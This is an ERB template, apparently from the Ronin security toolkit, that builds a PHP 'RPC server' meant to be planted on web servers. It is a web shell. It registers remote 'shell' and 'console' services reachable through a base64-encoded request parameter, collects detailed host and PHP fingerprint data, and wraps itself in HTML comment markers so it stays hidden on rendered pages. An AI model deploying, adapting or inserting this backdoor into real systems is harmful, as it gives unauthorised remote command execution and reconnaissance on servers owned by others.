// <!-- <?php
/*
 * Ronin PHP-RPC Server - A PHP-RPC server designed to work in hostile
 *  environments.
 *
 * Copyright (c) 2007-2009
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 */

<%= read_template 'msgpack.php' %>
<%= read_template 'rpc_server.php' %>
<%= read_template 'service.php' %>
<%= read_template 'console_service.php' %>
<%= read_template 'shell_service.php' %>
function running($params=array())
{
  return true;
}

function fingerprint($params=array())
{
  $profile = array(
    'os' => PHP_OS,
    'system_name' => php_uname('s'),
    'system_release' => php_uname('r'),
    'system_version' => php_uname('v'),
    'machine_type' => php_uname('m'),
    'host_name' => php_uname('n'),
    'php' => array(
      'prefix' => PHP_PREFIX,
      'bindir' => PHP_BINDIR,
      'config_dir' => PHP_CONFIG_FILE_SCAN_DIR,
      'datadir' => PHP_DATADIR,
      'extdir' => PHP_EXTENSION_DIR,
      'libdir' => PHP_LIBDIR,
      'lib_suffix' => PHP_SHLIB_SUFFIX,
      'loaded_exts' => get_loaded_extensions(),
      'server_api' => PHP_SAPI,
      'version' => array(
        'id' => PHP_VERSION_ID,
        'string' => PHP_VERSION,
        'major' => PHP_MAJOR_VERSION,
        'minor' => PHP_MINOR_VERSION,
        'release' => PHP_RELEASE_VERSION,
        'extra' => PHP_EXTRA_VERSION,
      )
    ),
    'cwd' => getcwd(),
    'disk_free_space' => disk_free_space('/'),
    'disk_total_space' => disk_total_space('/')
  );

  if (function_exists('posix_getuid'))
  {
    $profile['uid'] = posix_getuid();
  }

  if (function_exists('posix_getgid'))
  {
    $profile['gid'] = posix_getgid();
  }

  if (function_exists('php_ini_loaded_file'))
  {
    $profile['php']['loaded_ini_file'] = php_ini_loaded_file();
  }

  if (function_exists('php_ini_scanned_files'))
  {
    $profile['php']['ini_files'] = split(',',php_ini_scanned_files());
  }

  switch ($profile['php']['server_api'])
  {
  case 'apache':
    $profile['apache_version'] = apache_get_version();
    break;
  }

  return $profile;
}

<% unless options[:inline].empty? %>
/*
 * Inlined PHP: Start
 */
<% options[:inline].each { |path| %><%= File.read(path) %><% } %>
/*
 * Inlined PHP: End
 */
<% end %>

if (isset($_REQUEST['rpcrequest']))
{
  $server = new RPCServer();
  $server->register_method('running', 'running');
  $server->register_method('fingerprint', 'fingerprint');
  $server->register_service('console', new ConsoleService());
  $server->register_service('shell', new ShellService());

  $request = $_REQUEST['rpcrequest'];
  $call = MsgPack_Coder::decode(base64_decode(rawurldecode($request)));
  $return_value = $server->call_method($call);
  $response = base64_encode(MsgPack_Coder::encode($return_value));

  echo("<rpc-response>{$response}</rpc-response>");
  exit;
}
// ?> -->

<% unless options.no_ajax? %><%= erb 'ajax.php.erb' %><% end %>
